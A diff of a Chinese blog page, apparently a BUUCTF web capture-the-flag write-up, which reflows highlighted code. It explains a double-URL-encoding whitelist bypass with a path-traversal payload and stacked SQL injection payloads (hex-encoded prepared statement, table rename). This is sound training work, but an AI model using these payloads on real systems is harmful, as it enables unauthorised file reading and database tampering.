@@ -223,57 +223,57 @@
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">// source.php
-</span><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">class</span> <span class="nc">emmm</span>
-    <span class="p">{</span>
-        <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">checkFile</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$page</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
-            <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
-                <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
-                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-            <span class="p">}</span>
-
-            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-            <span class="p">}</span>
-
-            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
-                <span class="nv">$page</span><span class="p">,</span>
-                <span class="mi">0</span><span class="p">,</span>
-                <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
-            <span class="p">);</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-            <span class="p">}</span>
-
-            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
-            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
-                <span class="nv">$_page</span><span class="p">,</span>
-                <span class="mi">0</span><span class="p">,</span>
-                <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
-            <span class="p">);</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-            <span class="p">}</span>
-            <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
-            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-        <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-        <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-    <span class="p">)</span> <span class="p">{</span>
-        <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-        <span class="k">exit</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;img src=</span><span class="se">\&#34;</span><span class="s2">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span class="se">\&#34;</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>  
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// source.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">emmm</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">checkFile</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$_page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;img src=</span><span class="se">\&#34;</span><span class="s2">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span class="se">\&#34;</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>从<code>source.php</code>中还可以看到<code>hint.php</code>也包含一些信息。</p>
 <div class="highlight"><div class="chroma">
@@ -285,12 +285,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
-    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看<code>hint.php</code>，结果显示<code>flag</code>内容在<code>ffffllllaaaagggg</code>。直接访问该文件，发现无法访问（当然没这么简单了）</p>
 <p><figure><a class="lightgallery" href="/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226212604043.png" title="image-20210226212604043" data-thumbnail="/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226212604043.png" data-sub-html="<h2>image-20210226212604043</h2><p>image-20210226212604043</p>">
@@ -317,16 +317,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-    <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-    <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
-   <span class="p">)</span> <span class="p">{</span>
-    <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
-    <span class="k">exit</span><span class="p">;</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;img src=</span><span class="se">\&#34;</span><span class="s2">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span class="se">\&#34;</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
-<span class="p">}</span>  
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">   <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;img src=</span><span class="se">\&#34;</span><span class="s2">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span class="se">\&#34;</span><span class="s2"> /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>那就来看<code>checkFile()</code>函数，该函数返回true的地方一共有3处。</p>
 <p>首先定义了一个白名单。请求的文件名在白名单中即返回<code>true</code>，对应于之前提到的<code>source.php</code>和<code>hint.php</code>。显然这个逻辑无法被用来读取<code>flag</code>。</p>
@@ -343,16 +343,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
-    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>第二个逻辑中，参数首先被根据<code>?</code>字符进行截取，截取后的内容如果在白名单中则返回<code>true</code>。这个也无法被用来读取<code>flag</code>。</p>
 <p>相关函数：<a href="https://www.php.net/manual/zh/function.mb-strpos" target="_blank" rel="noopener noreffer">mb_strpos()</a>、<a href="https://www.php.net/manual/zh/function.mb-substr" target="_blank" rel="noopener noreffer">mb_substr()</a></p>
@@ -368,15 +368,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
-    <span class="nv">$page</span><span class="p">,</span>
-    <span class="mi">0</span><span class="p">,</span>
-    <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
-<span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-	<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>再看最后一个返回true的逻辑。发现其先将get请求中的file参数进行一次URL解码，然后再去截取<code>?</code>前的内容，判断是否在白名单内。同时，php在读取<code>$_REQUEST['file']</code>参数的时候，就会进行一次URL解码。所以，我们只需要在地址中加入<code>?</code>经过两次URL编码之后的内容<code>%253f</code>即可通过函数验证，并且使得参数在经过一次URL解码之后不含<code>?</code>，也就不会被当作其他get请求的参数。</p>
 <div class="highlight"><div class="chroma">
@@ -392,16 +392,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
-<span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
-    <span class="nv">$_page</span><span class="p">,</span>
-    <span class="mi">0</span><span class="p">,</span>
-	<span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
-<span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
-	<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>所以，可以构造payload。逐级添加<code>../</code>，找到<code>ffffllllaaaagggg</code>文件路径所在。</p>
 <div class="highlight"><div class="chroma">
@@ -409,8 +409,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">?file=source.php%253f/../../../../ffffllllaaaagggg
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">?file=source.php%253f/../../../../ffffllllaaaagggg
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure><a class="lightgallery" href="/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226210928641.png" title="image-20210226210928641" data-thumbnail="/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226210928641.png" data-sub-html="<h2>image-20210226210928641</h2><p>image-20210226210928641</p>">
         <img
@@ -476,27 +476,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">array(2) {
- [0]=&gt;
- string(1) &#34;1&#34;
- [1]=&gt;
- string(7) &#34;hahahah&#34;
-}
-
-array(2) {
- [0]=&gt;
- string(1) &#34;2&#34;
- [1]=&gt;
- string(12) &#34;miaomiaomiao&#34;
-}
-
-array(2) {
- [0]=&gt;
- string(6) &#34;114514&#34;
- [1]=&gt;
- string(2) &#34;ys&#34;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl"> [0]=&gt;
+</span></span><span class="line"><span class="cl"> string(1) &#34;1&#34;
+</span></span><span class="line"><span class="cl"> [1]=&gt;
+</span></span><span class="line"><span class="cl"> string(7) &#34;hahahah&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl"> [0]=&gt;
+</span></span><span class="line"><span class="cl"> string(1) &#34;2&#34;
+</span></span><span class="line"><span class="cl"> [1]=&gt;
+</span></span><span class="line"><span class="cl"> string(12) &#34;miaomiaomiao&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array(2) {
+</span></span><span class="line"><span class="cl"> [0]=&gt;
+</span></span><span class="line"><span class="cl"> string(6) &#34;114514&#34;
+</span></span><span class="line"><span class="cl"> [1]=&gt;
+</span></span><span class="line"><span class="cl"> string(2) &#34;ys&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>显然，这应该是查询语句所作用的表的所有记录，一共有3条。</p>
 <p>为了找到flag，使用堆叠注入，输入<code>1';show tables;#</code>，查询所有表名。发现存在<code>words</code>和<code>1919810931114514</code>两个表。</p>
@@ -550,8 +550,8 @@ array(2) {
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="思路2">思路2</h3>
 <p>直接修改表的名字，<code>rename</code>/<code>alter</code>等关键字是没有被筛选的，所以可以被输入执行。先将<code>words</code>表名改为其他名字，再将<code>1919810931114514</code>表名改为<code>words</code>。因为当前页面的查询对象就是表<code>words</code>，所以可以直接进行查询。</p>
@@ -561,9 +561,9 @@ array(2) {
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;;rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
-</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="c1">#
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;;rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
